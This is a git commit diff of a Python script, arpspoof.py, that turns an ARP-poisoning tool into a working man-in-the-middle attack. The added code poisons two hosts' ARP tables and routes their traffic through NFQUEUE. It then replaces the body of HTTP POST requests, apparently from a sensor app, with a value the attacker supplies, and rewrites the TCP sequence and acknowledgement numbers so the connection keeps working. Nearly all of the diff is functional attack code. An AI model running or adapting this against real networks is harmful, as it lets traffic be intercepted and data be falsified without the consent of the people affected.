aab75d6fddb1fa17b73df34d991b86a3f6b26c0e
Mateusz Koros <korosmateusz@protonmail.ch>
2017-12-10 22:59:03 +0100

    Changed program to perform Man In The Middle and spoof value sent by SensorReader app

--- arpspoof.py
+++ arpspoof.py
@@ -4,56 +4,44 @@ from multiprocessing import Process
 import time
 import argparse
 import os
-import sys
 import nfqueue
 import re
-
-def getRouter(interface):
-    return os.popen("ip route | grep " + interface).read().splitlines()[0].split()[2]
 
 def getOwnIp(interface):
     return os.popen('ip addr show ' + interface).read().split('inet ')[1].split('/')[0]
 
 def getMAC(args):
     ownMAC = open('/sys/class/net/' + args.interface + '/address').read().strip()
-    victimMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.victimIP).read().splitlines()[1])[0][1:-1]
-    routerMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.routerIP).read().splitlines()[1])[0][1:-1]
-    return ownMAC, victimMAC, routerMAC
-
-def nslookup(domain):
-    ips = [line.split()[1] for line in os.popen("nslookup " + domain + " | grep Address").read().splitlines()]
-    ips.pop(0)
-    return ips
+    clientMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.clientIP).read().splitlines()[1])[0][1:-1]
+    serverMAC = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.serverIP).read().splitlines()[1])[0][1:-1]
+    return ownMAC, clientMAC, serverMAC
 
 def getArguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument('victimIP', help='IP address of a victim')
-    parser.add_argument('--domain', '-d', required=True, help='Domain to block')
+    parser.add_argument('clientIP', help='IP address of the first machine')
+    parser.add_argument('serverIP', help='IP address of the second machine')
+    parser.add_argument('--spoofValue', '-s', required=True, help='Value to send instead of the genuine one')
     parser.add_argument('--interface', '-i', default='wlan0', help='Interface to use, default is wlan0')
-    parser.add_argument('--routerIP', '-r', default=None, help='IP address of a router')
     args = parser.parse_args()
-    if args.routerIP == None:
-        args.routerIP = getRouter(args.interface)
     args.ownIp = getOwnIp(args.interface)
-    args.ownMAC, args.victimMAC, args.routerMAC = getMAC(args)
+    args.ownMAC, args.clientMAC, args.serverMAC = getMAC(args)
     print('Configuration:')
     print('\t' + str(args)[str(args).find('(') + 1:str(args).find(')')].replace(' ', '\n\t'))
     return args
 
-def osConfiguration(interface):
+def osConfiguration(args):
     print('Adjusting system settings...')
     sysFile = open("/proc/sys/net/ipv4/ip_forward", "w")
     sysFile.write('1')
     sysFile.close()
-    sysFile = open("/proc/sys/net/ipv4/conf/" + interface + "/send_redirects", "w")
+    sysFile = open("/proc/sys/net/ipv4/conf/" + args.interface + "/send_redirects", "w")
     sysFile.write('0')
     sysFile.close()
- 
     os.system("iptables -Z")
     os.system("iptables -F")
     os.system("iptables -X")
-    os.system("iptables --append FORWARD --in-interface " +  interface + " -j NFQUEUE")
-    os.system("iptables -t nat --append POSTROUTING --out-interface " + interface + " -j MASQUERADE")
+    os.system("iptables --append FORWARD --in-interface " +  args.interface + " --source " + args.serverIP + " --destination " + args.clientIP + " -j NFQUEUE")
+    os.system("iptables --append FORWARD --in-interface " +  args.interface + " --source " + args.clientIP + " --destination " + args.serverIP + " -j NFQUEUE")
 
 def osRestore(interface):
     print('Restoring system settings...')
@@ -78,47 +66,77 @@ def createNetFilterQueue():
 def arpPoison(args):
     print('Starting ARP poisoning...')
     conf.iface = args.interface
-    victimPacket = ARP(op='is-at', hwsrc=args.ownMAC)
-    routerPacket = ARP(op='is-at', hwsrc=args.ownMAC)
-    victimPacket.psrc = args.routerIP
-    victimPacket.pdst = args.victimIP
-    victimPacket.hwdst = args.victimMAC
-    routerPacket.psrc = args.victimIP
-    routerPacket.pdst = args.routerIP
-    routerPacket.hwdst = args.routerMAC
+    clientPacket = ARP(op='is-at', hwsrc=args.ownMAC)
+    serverPacket = ARP(op='is-at', hwsrc=args.ownMAC)
+    clientPacket.psrc = args.serverIP
+    clientPacket.pdst = args.clientIP
+    clientPacket.hwdst = args.clientMAC
+    serverPacket.psrc = args.clientIP
+    serverPacket.pdst = args.serverIP
+    serverPacket.hwdst = args.serverMAC
     while True:
-        send(victimPacket, verbose=False)
-        send(routerPacket, verbose=False)
+        send(clientPacket, verbose=False)
+        send(serverPacket, verbose=False)
         time.sleep(5.0)
 
 def arpRestore(args):
-    print('Restoring ARP table...')
+    print('Restoring victims\' ARP tables...')
     conf.iface = args.interface
-    victimPacket = ARP(op='is-at', hwsrc=args.routerMAC)
-    routerPacket = ARP(op='is-at', hwsrc=args.victimMAC)
-    victimPacket.psrc = args.routerIP
-    victimPacket.pdst = args.victimIP
-    victimPacket.hwdst = args.victimMAC
-    routerPacket.psrc = args.victimIP
-    routerPacket.pdst = args.routerIP
-    routerPacket.hwdst = args.routerMAC
-    send(victimPacket, verbose=False)
-    send(routerPacket, verbose=False)
+    clientPacket = ARP(op='is-at')
+    serverPacket = ARP(op='is-at')
+    clientPacket.hwsrc = args.serverMAC
+    clientPacket.hwdst = args.clientMAC
+    clientPacket.psrc = args.serverIP
+    clientPacket.pdst = args.clientIP
+    serverPacket.hwsrc = args.clientMAC
+    serverPacket.hwdst = args.serverMAC
+    serverPacket.psrc = args.clientIP
+    serverPacket.pdst = args.serverIP
+    send(clientPacket, verbose=False)
+    send(serverPacket, verbose=False)
  
 def callback(payload):
-    data = payload.get_data()
-    packet = IP(data)
-    print("Packet src: " + packet.src + " | Packet dst: " + packet.dst)
-    if packet.dst in domainIps:
-        payload.set_verdict(nfqueue.NF_DROP)
-    else:
-        payload.set_verdict(nfqueue.NF_ACCEPT)
+    # difference in TCP sequence and acknowledgement caused by spoofed value extending/shortening load length
+    if 'ackDiff' not in callback.__dict__:
+        callback.ackDiff = 0
+    tcpFINFlag = 0x01
+    packet = IP(payload.get_data())
+    try:
+        if tcpFINFlag & packet[TCP].flags and packet.src == callback.client:
+            # client initialized finish, reset sequence and acknowledgement spoof
+            callback.ackDiff = 0
+        elif callback.ackDiff != 0 and packet.src == callback.server:
+            packet[TCP].ack -= callback.ackDiff
+            del packet[IP].chksum
+            del packet[TCP].chksum
+        elif callback.ackDiff != 0 and packet.src == callback.client:
+            packet[TCP].seq += callback.ackDiff
+            del packet[IP].chksum
+            del packet[TCP].chksum
+    except:
+        pass
+    try:
+        if 'POST' in packet.load:
+            callback.server = packet.dst
+            callback.client = packet.src
+            prevLen = len(packet[TCP].payload)
+            unchangedLoad = packet.load.rsplit('Content-Length: ', 1)[0]
+            packet.load = unchangedLoad + 'Content-Length: %d\r\n\r\n%s' % (len(callback.spoofValue), callback.spoofValue)
+            newLen = len(packet[TCP].payload)
+            lenDiff = newLen - prevLen
+            packet[IP].len += lenDiff
+            callback.ackDiff += lenDiff
+            del packet[IP].chksum
+            del packet[TCP].chksum
+    except:
+        pass
+    send(packet, verbose=False)
+    payload.set_verdict(nfqueue.NF_DROP)
 
 def main():
     args = getArguments()
-    global domainIps
-    domainIps = nslookup(args.domain)
-    osConfiguration(args.interface)
+    osConfiguration(args)
+    callback.spoofValue = args.spoofValue
     queue = createNetFilterQueue()
     arpPoisonDaemon = Process(target=arpPoison, args=(args,))
     arpPoisonDaemon.daemon = True
